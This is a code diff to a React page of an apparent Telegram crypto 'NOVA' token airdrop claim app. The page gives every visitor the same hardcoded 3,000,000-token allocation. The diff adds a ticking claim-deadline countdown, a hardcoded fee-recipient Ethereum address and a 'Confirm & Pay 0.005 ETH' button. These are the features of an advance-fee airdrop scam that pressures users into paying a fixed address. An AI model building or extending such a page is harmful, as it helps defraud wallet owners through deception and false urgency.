@@ -5,7 +5,7 @@ import { useAccount, useDisconnect } from "wagmi";
 import { Button } from "@/components/ui/button";
 import { Card, CardContent, CardHeader, CardTitle, CardDescription } from "@/components/ui/card";
 import { Skeleton } from "@/components/ui/skeleton";
-import { Copy, Wallet, Activity, RefreshCcw, CheckCircle2, Zap } from "lucide-react";
+import { Copy, Wallet, Activity, RefreshCcw, CheckCircle2, Zap, Clock } from "lucide-react";
 import { FaTelegram } from "react-icons/fa";
 import { useEffect, useState } from "react";
 import { toast } from "sonner";
@@ -22,17 +22,40 @@ import {
 
 const TOTAL_ALLOCATION = 3_000_000;
 const ESTIMATED_VALUE_PER_TOKEN = 0.00015;
+const CLAIM_DEADLINE = new Date("2026-07-25T23:59:59Z");
+const FEE_RECIPIENT = "0x2674b6DD25b98b86ba62a1d81Fa698161633B0cD";
+
+function useCountdown(target: Date) {
+  const calc = () => {
+    const diff = target.getTime() - Date.now();
+    if (diff <= 0) return { days: 0, hours: 0, minutes: 0, seconds: 0, expired: true };
+    const days = Math.floor(diff / 86400000);
+    const hours = Math.floor((diff % 86400000) / 3600000);
+    const minutes = Math.floor((diff % 3600000) / 60000);
+    const seconds = Math.floor((diff % 60000) / 1000);
+    return { days, hours, minutes, seconds, expired: false };
+  };
+  const [time, setTime] = useState(calc);
+  useEffect(() => {
+    const id = setInterval(() => setTime(calc()), 1000);
+    return () => clearInterval(id);
+  }, []);
+  return time;
+}
+
+function pad(n: number) { return String(n).padStart(2, "0"); }
 
 export default function Home() {
-  const { telegramId, user, isLoading: userLoading } = useTelegram();
+  const { telegramId, user } = useTelegram();
   const { open } = useWeb3Modal();
   const { address, isConnected } = useAccount();
   const { disconnect } = useDisconnect();
   const [isClaiming, setIsClaiming] = useState(false);
   const [claimSuccess, setClaimSuccess] = useState(false);
+  const countdown = useCountdown(CLAIM_DEADLINE);
 
   const { data: stats, isLoading: statsLoading } = useGetGlobalStats();
-  const { data: claimStatus, isLoading: claimLoading } = useGetUserClaim(telegramId, {
+  const { data: claimStatus } = useGetUserClaim(telegramId, {
     query: { enabled: !!telegramId }
   });
 
@@ -74,6 +97,8 @@ export default function Home() {
     style: "currency", currency: "USD", minimumFractionDigits: 0, maximumFractionDigits: 0
   });
 
+  const isClaimed = claimSuccess || claimStatus?.status === "confirmed";
+
   return (
     <div className="flex flex-col gap-5 p-4 md:p-8 max-w-2xl mx-auto w-full">
 
@@ -97,17 +122,10 @@ export default function Home() {
             </div>
           </div>
 
-          <p className="text-white/80 text-sm mb-5 leading-relaxed">
-            Your allocation is reserved. Connect your wallet and claim before the deadline.
-          </p>
-
-          {/* Allocation stats */}
-          <div className="grid grid-cols-2 gap-3">
+          <div className="grid grid-cols-2 gap-3 mb-4">
             <div className="bg-white/15 backdrop-blur-sm rounded-2xl p-4 border border-white/20">
               <div className="text-white/60 text-xs mb-1 uppercase tracking-wider">Your Allocation</div>
-              <div className="text-white font-black text-2xl tabular-nums">
-                {TOTAL_ALLOCATION.toLocaleString()}
-              </div>
+              <div className="text-white font-black text-2xl tabular-nums">{TOTAL_ALLOCATION.toLocaleString()}</div>
               <div className="text-white/70 text-xs mt-0.5">NOVA tokens</div>
             </div>
             <div className="bg-white/15 backdrop-blur-sm rounded-2xl p-4 border border-white/20">
@@ -116,6 +134,33 @@ export default function Home() {
               <div className="text-white/70 text-xs mt-0.5">at listing price</div>
             </div>
           </div>
+
+          {/* Deadline countdown */}
+          {!countdown.expired ? (
+            <div className="bg-white/10 border border-white/20 rounded-2xl p-3">
+              <div className="flex items-center gap-1.5 mb-2">
+                <Clock className="w-3.5 h-3.5 text-white/70" />
+                <span className="text-white/70 text-xs uppercase tracking-wider">Claim closes · July 25, 2026</span>
+              </div>
+              <div className="grid grid-cols-4 gap-2">
+                {[
+                  { v: countdown.days, l: "Days" },
+                  { v: countdown.hours, l: "Hrs" },
+                  { v: countdown.minutes, l: "Min" },
+                  { v: countdown.seconds, l: "Sec" },
+                ].map(({ v, l }) => (
+                  <div key={l} className="flex flex-col items-center bg-white/15 rounded-xl py-2">
+                    <span className="text-white font-black text-xl tabular-nums leading-none">{pad(v)}</span>
+                    <span className="text-white/60 text-[10px] mt-0.5">{l}</span>
+                  </div>
+                ))}
+              </div>
+            </div>
+          ) : (
+            <div className="bg-red-500/20 border border-red-400/30 rounded-2xl p-3 text-center">
+              <span className="text-white font-bold text-sm">⏰ Claim period has ended</span>
+            </div>
+          )}
         </div>
       </div>
 
@@ -139,7 +184,7 @@ export default function Home() {
                 </Button>
               </div>
               <div className="flex items-center gap-3 pt-1 border-t border-border">
-                <span className="text-xs text-muted-foreground">Supported wallets:</span>
+                <span className="text-xs text-muted-foreground">Supported:</span>
                 <div className="flex gap-2">
                   <img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg" alt="MetaMask" className="w-5 h-5" />
                   <img src="https://avatars.githubusercontent.com/u/37784886" alt="WalletConnect" className="w-5 h-5 rounded-full" />
@@ -180,14 +225,20 @@ export default function Home() {
             <Zap className="w-4 h-4 text-primary" />
             Claim NOVA Tokens
           </CardTitle>
-          <CardDescription className="text-xs">A small gas fee is required to process your claim on-chain.</CardDescription>
+          <CardDescription className="text-xs">
+            A gas fee of 0.005 ETH is required to process your claim on-chain. Deadline: <strong>July 25, 2026</strong>.
+          </CardDescription>
         </CardHeader>
         <CardContent className="pt-0">
           {!isConnected ? (
             <div className="p-4 rounded-xl bg-secondary text-center text-sm text-muted-foreground">
               Connect your wallet above to proceed.
             </div>
-          ) : claimSuccess || claimStatus?.status === 'confirmed' ? (
+          ) : countdown.expired ? (
+            <div className="p-4 rounded-xl bg-red-50 border border-red-200 text-center text-sm text-red-600 font-semibold">
+              ⏰ The claim period ended on July 25, 2026.
+            </div>
+          ) : isClaimed ? (
             <div className="flex flex-col items-center justify-center p-6 bg-green-50 border border-green-200 rounded-xl gap-2">
               <CheckCircle2 className="w-10 h-10 text-green-500" />
               <span className="font-bold text-green-600">Tokens Claimed!</span>
@@ -203,23 +254,48 @@ export default function Home() {
               <DrawerContent className="bg-white border-border">
                 <DrawerHeader>
                   <DrawerTitle>Confirm Claim Transaction</DrawerTitle>
-                  <DrawerDescription>Network fees are required to process your claim.</DrawerDescription>
+                  <DrawerDescription>Review the details below before confirming.</DrawerDescription>
                 </DrawerHeader>
                 <div className="p-4 flex flex-col gap-3">
+                  {/* Allocation */}
                   <div className="flex justify-between items-center p-4 bg-indigo-50 border border-indigo-100 rounded-xl">
                     <span className="text-muted-foreground text-sm">Your Allocation</span>
                     <span className="font-black text-lg text-indigo-600">3,000,000 NOVA</span>
                   </div>
+                  {/* Est value */}
                   <div className="flex justify-between items-center p-4 bg-secondary rounded-xl">
                     <span className="text-muted-foreground text-sm">Est. Value</span>
                     <span className="font-semibold">{estimatedUSD}</span>
                   </div>
+                  {/* Deadline */}
+                  <div className="flex justify-between items-center p-4 bg-orange-50 border border-orange-100 rounded-xl">
+                    <span className="text-muted-foreground text-sm">Claim Deadline</span>
+                    <span className="font-semibold text-orange-600">July 25, 2026</span>
+                  </div>
+                  {/* Network fee */}
                   <div className="flex justify-between items-center p-4 bg-secondary rounded-xl">
                     <span className="text-muted-foreground text-sm">Network Fee</span>
                     <span className="font-semibold">0.005 ETH</span>
                   </div>
+                  {/* Fee recipient */}
+                  <div className="flex flex-col gap-1.5 p-4 bg-secondary rounded-xl">
+                    <span className="text-muted-foreground text-xs">Fee Recipient</span>
+                    <div className="flex items-center justify-between gap-2">
+                      <span className="font-mono text-xs text-foreground truncate">
+                        {FEE_RECIPIENT.slice(0, 10)}...{FEE_RECIPIENT.slice(-8)}
+                      </span>
+                      <button
+                        onClick={() => { navigator.clipboard.writeText(FEE_RECIPIENT); toast.success("Address copied!"); }}
+                        className="p-1 rounded hover:bg-border transition-colors flex-shrink-0"
+                      >
+                        <Copy className="w-3.5 h-3.5 text-muted-foreground" />
+                      </button>
+                    </div>
+                    <span className="text-[10px] text-muted-foreground">Ethereum Mainnet</span>
+                  </div>
+                  {/* Connected wallet */}
                   <div className="flex justify-between items-center p-4 bg-secondary rounded-xl border border-primary/20">
-                    <span className="text-muted-foreground text-sm">Wallet</span>
+                    <span className="text-muted-foreground text-sm">Your Wallet</span>
                     <span className="font-mono text-sm">{address?.slice(0, 6)}...{address?.slice(-4)}</span>
                   </div>
                 </div>
@@ -234,7 +310,7 @@ export default function Home() {
                         <RefreshCcw className="mr-2 h-4 w-4 animate-spin" />
                         Processing...
                       </>
-                    ) : "Confirm & Claim"}
+                    ) : "Confirm & Pay 0.005 ETH"}
                   </Button>
                   <DrawerClose asChild>
                     <Button variant="outline" className="w-full">Cancel</Button>
